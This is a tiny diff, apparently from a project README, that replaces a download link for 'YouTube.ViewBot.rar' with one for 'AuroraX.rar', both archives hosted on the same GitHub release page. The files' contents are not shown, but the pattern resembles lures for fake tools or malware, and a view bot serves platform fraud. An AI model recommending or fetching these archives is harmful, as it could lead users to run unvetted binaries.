@@ -22,4 +22,4 @@
 ---
 
 
-## [📁Download](https://github.com/Shef228/QQQ/releases/download/you/YouTube.ViewBot.rar)
+## [📁Download](https://github.com/Shef228/QQQ/releases/download/AUR/AuroraX.rar)
